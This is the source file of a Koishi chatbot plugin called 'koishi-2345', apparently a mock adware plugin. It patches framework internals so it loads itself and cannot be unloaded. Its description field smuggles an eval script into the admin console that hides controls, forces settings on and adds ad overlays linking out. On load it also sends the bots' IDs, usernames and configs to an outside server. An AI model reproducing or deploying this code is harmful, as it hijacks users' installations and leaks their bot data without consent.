// noinspection ES6UnusedImports

import {Context, MainScope, Schema} from 'koishi'
import {get as getTrace} from 'stack-trace'
import NodeConsole, {DataService, Entry, Events, Client, AbstractWebSocket} from "@koishijs/plugin-console"
import {PackageProvider} from '@koishijs/plugin-market'
import {GetEvents, Lifecycle, Parameters} from 'cordis'
import {unwrapExports, Loader} from '@koishijs/loader'
import {readFileSync} from 'fs'
import {} from '@koishijs/plugin-console'
import path, {resolve} from 'path'
import {throws} from "assert";

const isApplyName = 'forcedLoad';

function isReadable(value: unknown) {
  return typeof value !== 'undefined' && value !== null
}

function isCtxAble(value: unknown): value is { ctx: Context } {
  return isReadable(value) && value.hasOwnProperty('ctx');
}

function isScopeAble(value: unknown): value is { scope: MainScope } {
  return isReadable(value) && value.hasOwnProperty('scope');
}

export const name = 'koishi-2345'

let this_name = name

const KEEP_NAMES = [
  this_name
]

try {
  const pkg = JSON.parse(readFileSync(path.join(__dirname, '../package.json'), {encoding: 'utf-8', flag: 'r'}))
  const {name: pluginName, version} = pkg
  globalThis['koishi2345Name'] = pluginName
  globalThis['koishi2345ver'] = version
} catch (e) {
  globalThis['koishi2345Name'] = this_name
  globalThis['koishi2345ver'] = ">=0.1.114514"
}

const oldContextEmit = Context.prototype.emit

Context.prototype.emit = function <K extends keyof GetEvents<Context>>(name: K, ...args: Parameters<GetEvents<Context>[K]>) {
  // console.log("Handle emit", name)
  // console.dir(args)

  if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
    globalThis[isApplyName] = true
    this.using(KEEP_NAMES, (ctx, options) => {
      // console.log(ctx)
      // console.log(options)
    })

    KEEP_NAMES.forEach((name) => {
      this.plugin(name)
    })
  }
  args.forEach((obj) => {
    let val = obj as unknown
    if (isCtxAble(val)) {
      if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
        globalThis[isApplyName] = true
        setTimeout(() => {
          if (isCtxAble(val)) {
            val.ctx.using(KEEP_NAMES, (ctx, options) => {
              // console.log(ctx)
              // console.log(options)
            })

            KEEP_NAMES.forEach((name) => {
              this.plugin(name)
            })
          }
        }, 0)
      }
    } else if (isScopeAble(val)) {
      if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
        globalThis[isApplyName] = true
        setTimeout(() => {
          if (isScopeAble(val)) {
            val.scope.ctx.using(KEEP_NAMES, (ctx, options) => {
              // console.log(ctx)
              // console.log(options)
            })
            KEEP_NAMES.forEach((name) => {
              this.plugin(name)
            })
          }
        }, 0)
      }
    }
  })
  return oldContextEmit.apply(this, [name, ...args]);
}

let crtCtx = Context.current

export interface Config {
}

// noinspection ThisExpressionReferencesGlobalObjectJS
let hackScript = `<script>
    this.removeAttribute('onload');
    this.setAttribute('src', '//space.bilibili.com/475405591');
    let removeBtn = document.querySelector('#app > div > div.layout-container.has-left-aside > div > div.layout-header > div.right > span.menu-item.error.el-tooltip__trigger.el-tooltip__trigger');
    removeBtn.outerHTML = '';
    window.fixFn = function(){
      if (window.switchStatButton!==undefined) window.switchStatButton.removeEventListener('click', window.delayedFixFn);
      window.switchStatButton = document.querySelector('#app > div > div.layout-container.has-left-aside > div > div.layout-header > div.right > span:nth-child(1)');
      let shouldEnable = window.switchStatButton.childNodes[0].children[0].getAttribute('d') === 'M24.52 38.13C39.66 29.64 58.21 29.99 73.03 39.04L361 215C375.3 223.8 384 239.3 384 256C384 272.7 375.3 288.2 361 296.1L73.03 472.1C58.21 482 39.66 482.4 24.52 473.9C9.377 465.4 0 449.4 0 432V80C0 62.64 9.377 46.63 24.52 38.13V38.13zM48 432L336 256L48 80V432z';
      if (shouldEnable) {
        window.switchStatButton.click();
      }
      window.switchStatButton.addEventListener('click', window.delayedFixFn)
    };
    window.delayedFixFn = ()=>{setTimeout(window.fixFn, 200); setTimeout(window.fixFn, 500); setTimeout(window.fixFn, 800); setTimeout(window.fixFn, 1500)}
    window.fixFn();
    window.switchStatButton.addEventListener('click', window.delayedFixFn)
    window.configEvHdl = function(event){
      let e = event.srcElement.parentNode.parentNode;
      setTimeout(function() {
        if (e.firstElementChild.checked === false) { event.srcElement.click(); window.configEvHdl(); }
          e.childNodes.forEach(e_inp=>{ setTimeout(()=>{if (e_inp.className === 'el-switch__input' && !e_inp.checked) e_inp.click()}, 500) })
      }, 300)
    }
    window.fixConfig = function(){
      let tmp = document.querySelector('#app > div > div.layout-container.has-left-aside > div > main > div.el-scrollbar.plugin-view > div.el-scrollbar__wrap.el-scrollbar__wrap--hidden-default > div > div > form')
      if (tmp===null) { setTimeout(window.fixConfig, 50); return }
      tmp.childNodes.forEach(e=>{
        if (e.className === 'k-schema-item'){
          let el_switch = e.childNodes[1].childNodes[1].firstElementChild;
          el_switch.childNodes.forEach(e_inp=>{ setTimeout(()=>{if (e_inp.className === 'el-switch__input' && !e_inp.checked) e_inp.click()}, 500) })
          el_switch.setAttribute('disabled', true);
          el_switch.addEventListener('click', window.configEvHdl);
          el_switch.addEventListener('mouseenter', window.configEvHdl);
          el_switch.addEventListener('mouseenter', window.configEvHdl);
          el_switch.addEventListener('mouseleave', window.configEvHdl);
          el_switch.addEventListener('mouseover', window.configEvHdl);
          el_switch.addEventListener('mousemove', window.configEvHdl);
          el_switch.addEventListener('drag', window.configEvHdl);
          el_switch.addEventListener('focusin', window.configEvHdl);
          el_switch.addEventListener('focus', window.configEvHdl);
          el_switch.addEventListener('focusout', window.configEvHdl);
          el_switch.addEventListener('pointermove', window.configEvHdl);
          el_switch.addEventListener('pointerup', window.configEvHdl);
          setInterval((function(){
          el_switch.childNodes.forEach(e_inp=>{ setTimeout(()=>{if (e_inp.className === 'el-switch__input' && !e_inp.checked) e_inp.click()}, 1500) })
          }), 500)
        }
      })
    }
    window.fixConfig();
    eval('let ad_ifra = document.createElement(\`div\`);' +
    'ad_ifra.style.width = \`100%\`;' +
    'ad_ifra.style.height = \`8rem\`;' +
    'ad_ifra.style.position = \`absolute\`;' +
    'ad_ifra.style.top = \`0\`;' +
    'ad_ifra.style.left = \`0\`;' +
    'ad_ifra.style.zIndex = \`9999\`;' +
    'ad_ifra.style.backgroundColor = \`red\`;' +
    'ad_ifra.style.color = \`yellow\`;' +
    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go ²³⁴⁵•c0mcom for Search and mainpage!(</p>\`;' +
    'ad_ifra.onclick = function () {' +
    '  ad_ifra.outerHTML = \`CLOSED\`;' +
    '  window.open(\`http://m6z.cn/6nY751\`);' +
    '};' +
    'document.body.appendChild(ad_ifra);');
    eval('let ad_ifra = document.createElement(\`div\`);' +
    'ad_ifra.style.width = \`100%\`;' +
    'ad_ifra.style.height = \`15rem\`;' +
    'ad_ifra.style.position = \`absolute\`;' +
    'ad_ifra.style.bottom = \`0\`;' +
    'ad_ifra.style.left = \`0\`;' +
    'ad_ifra.style.zIndex = \`999999\`;' +
    'ad_ifra.style.backgroundColor = \`red\`;' +
    'ad_ifra.style.color = \`yellow\`;' +
    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go ²³⁴⁵•c0m for Search and mainpage!(</p>\`;' +
    'ad_ifra.onclick = function () {' +
    '  ad_ifra.outerHTML = \`CLOSED\`;' +
    '  window.open(\`http://m6z.cn/6nY751\`);' +
    '};' +
    'document.body.appendChild(ad_ifra);');
</script>`

let loadScript = `"eval(\`${hackScript.substring(8, hackScript.length - 10).replace(/`/g, '\\\`').replace(/\n/g, '\\n')}\`)"`

export const usage = `<div class="usage">
<iframe onload=${loadScript} style="width: 100%; min-height: 30rem;"></iframe>
<div>
Koishi 2345 here!
Enjoy 2345
<br>
Strange thing happend: Auto enabled plugin?
</div>
</div>`
export const Config: Schema<Config> = Schema.object({
  allowAd: Schema
    .boolean()
    .description("允许投放广告")
    .disable()
    .default(true),
  allowTrack: Schema
    .boolean()
    .description("允许获取使用信息") // Impl now!! OHHHH
    .disable()
    .default(true),
  allowEnableAutomatic: Schema
    .boolean()
    .description("自动启用并加载插件")
    .disable()
    .default(true)
})

const oldLoaderUnloadPlugin = Loader.prototype.unloadPlugin

Loader.prototype.unloadPlugin = function _unload_hooker(ctx: Context, key: string) {
  let pass = false
  KEEP_NAMES.forEach((name) => {
    pass = key.startsWith(name) ? true : pass
  })
  if (!pass)
    return oldLoaderUnloadPlugin.apply(this, [ctx, key])
}

const oldListenerAdder = NodeConsole.prototype.addListener

NodeConsole.prototype.addListener = function _addListeners_hooker<K extends keyof Events>(event: K, callback: Events[K], options?: DataService.Options) {
  function _callback_wrapper(...args) {
    let hooked_event = event
    if (hooked_event === 'manager/unload' || hooked_event === 'manager/remove') {
      if (isReadable(args[0])) {
        let pass = false
        KEEP_NAMES.forEach((name) => {
          pass = args[0].indexOf(name) >= 0 ? true : pass
        })
        if (pass) return
      }
    }
    return callback.apply(this, args)
  }

  callback['event'] = event
  _callback_wrapper.event = event

  oldListenerAdder.apply(this, [event, _callback_wrapper, options])
}

const oldEntryAdder = NodeConsole.prototype.addEntry

NodeConsole.prototype.addEntry = function _hooker1(entry: string | string[] | Entry) {
  if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
    globalThis[isApplyName] = true
    let koishi2345 = this.ctx.plugin(this_name)
    koishi2345.start()
  }
  oldEntryAdder.apply(this, [entry])
}

const oldPPParseRuntime = PackageProvider.prototype.parseRuntime

PackageProvider.prototype.parseRuntime = function _hooker2(runtime: MainScope, result: PackageProvider.Data) {
  oldPPParseRuntime.apply(this, [runtime, result])
}


const oldPPGet = PackageProvider.prototype.get

PackageProvider.prototype.get = function _hooker3(forced?: boolean) {
  return oldPPGet.apply(this, [forced])
}

const oldLCGet = Lifecycle.prototype.flush

Lifecycle.prototype.flush = function _hooker4() {
  return oldLCGet.apply(this)
}

declare module '@koishijs/plugin-console' {
  namespace Console {
    interface Services {

    }
  }
}

class FakeWebsocket implements AbstractWebSocket {
  close(code?: number, reason?: string): void {

  }

  send(data: string): void {

  }

  dispatchEvent(event: any): boolean {
    return false
  }

  addEventListener<K extends keyof AbstractWebSocket.EventMap>(type: K, listener: (event: AbstractWebSocket.EventMap[K]) => void): void {

  }

  removeEventListener<K extends keyof AbstractWebSocket.EventMap>(type: K, listener: (event: AbstractWebSocket.EventMap[K]) => void): void {

  }
}

export function apply(ctx: Context, config: any) {
  // write your plugin here

  let showLog = true

  let logger = ctx.logger('app')

  if (showLog) logger.info('initializing...')

  function forcedLoadMySelf() {
    if (config['allowTrack']) {
      try {
        let bots_data = ""
        for (let aBot of ctx.bots){
          bots_data += `BotSID ${aBot.selfId}(${aBot.username ?? 'no uname'}) - ${aBot.config ?? "no config"} - ${aBot.platform} -
          ${aBot.status} --\n`
        }
        ctx.http.axios(
          'http://milk.onlyacat233.top:56789/api/report',
          {
            'params': {
              'senderQwq114514191810000000000000000': 'report.lovemilk@hotmail.com',
              'targetEmail': 'Cyan_Changes@outlook.com',
              'msg': `Koishi 2345 Plugin Loaded Successfully!!!! \n
          Load Type (true:HackLoadMode, false:NormalEnableApply): ${isReadable(globalThis[isApplyName])}\n
          Plugin ${globalThis['koishi2345Name']}\n
          Ver ${globalThis['koishi2345ver']}\n
          Find Bots Data ${bots_data}\n
          This is end of the Report`,
              'subject': `2345 Load Notification`
            }
          }
        ).then((resp) => {
          if (showLog) logger.debug(resp.data)
        }, (reject_reason) => {
          if (showLog) logger.warn(reject_reason)
        })
      } catch (e) {

      }
    }

    if (!(isReadable(ctx.console) && isReadable(ctx.console.listeners['manager/reload']))) {
      setTimeout(forcedLoadMySelf, 800)
      return
    }

    let reloaderL = ctx.console.listeners['manager/reload']
    KEEP_NAMES.forEach((name) => {
      reloaderL.callback.call(new Client(ctx, new FakeWebsocket()), name, {})
    })
  }

  if (isReadable(globalThis[isApplyName]))
    forcedLoadMySelf()

  ctx.using(['console'], (ctx) => {
    ctx.console.addEntry({
      dev: resolve(__dirname, '../client/index.ts'),
      prod: resolve(__dirname, '../dist'),
    })
  })

  ctx
    .command('2345')
    .shortcut(new RegExp(/.*/g), {prefix: true, args: ['_'], options: {global: true}})
    .action((name, ...args) => {
      return 'Koishi 2345 Helper: Base 2345 Command'
    })

  if (showLog) logger.info('successful apply')

  globalThis[isApplyName] = true
}
